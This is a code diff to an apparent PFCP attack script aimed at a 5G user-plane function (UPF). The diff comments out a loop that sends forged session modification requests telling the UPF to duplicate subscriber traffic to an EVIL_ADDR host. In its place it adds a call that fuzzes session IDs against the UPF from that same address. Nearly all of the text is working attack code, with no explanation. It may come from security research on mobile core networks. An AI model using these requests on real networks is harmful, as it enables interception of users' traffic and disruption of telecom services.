@@ -3,6 +3,7 @@ from scapy.contrib.pfcp import *
 from pfcpToolkit import PFCPToolkit
 import random
 from pfcpToolkit import PFCPToolkit
+from pfcpFuzzer import PFCPFuzzer
 teid_counter = 1
 randomize_teid = False
 teid = None
@@ -185,30 +186,36 @@ NET_IFACE= "eth0"
 
 
 
-conf.verb = 0
-PFCPToolkit_obj = PFCPToolkit(
-    src_addr=EVIL_ADDR,
-    dest_addr=UPF_ADDR,
-    src_port=SRC_PORT,
-    dest_port=DEST_PORT,
-    verbose=True
-)
-for seid in range(1,10):
-    for farid in range(1,100):
-        PFCPToolkit_obj.Send_PFCP_session_modification_req(
-            seid=seid,
-            far_id=farid,
-            src_addr=EVIL_ADDR,
-            dest_addr=UPF_ADDR,
-            src_port=SRC_PORT,
-            dest_port=DEST_PORT,
-            apply_action=["FORW", "DUPL"],
-            tdest_addr=EVIL_ADDR
+# conf.verb = 0
+# PFCPToolkit_obj = PFCPToolkit(
+#     src_addr=EVIL_ADDR,
+#     dest_addr=UPF_ADDR,
+#     src_port=SRC_PORT,
+#     dest_port=DEST_PORT,
+#     verbose=True
+# )
+# for seid in range(1,10):
+#     for farid in range(1,100):
+#         PFCPToolkit_obj.Send_PFCP_session_modification_req(
+#             seid=seid,
+#             far_id=farid,
+#             src_addr=EVIL_ADDR,
+#             dest_addr=UPF_ADDR,
+#             src_port=SRC_PORT,
+#             dest_port=DEST_PORT,
+#             apply_action=["FORW", "DUPL"],
+#             tdest_addr=EVIL_ADDR
             
-        )
+#         )
         
-print ("PFCP Session Modification Request sent")
+# print ("PFCP Session Modification Request sent")
        
-    
-
-
+PFCPFuzzer_obj = PFCPFuzzer()
+PFCPFuzzer_obj.set_verbose(True)
+PFCPFuzzer_obj.Start_PFCP_SEID_fuzzing(
+    upf_addr=UPF_ADDR,
+    src_addr=EVIL_ADDR,
+    max_seid=10,
+    src_port=SRC_PORT,
+    dest_port=DEST_PORT
+)
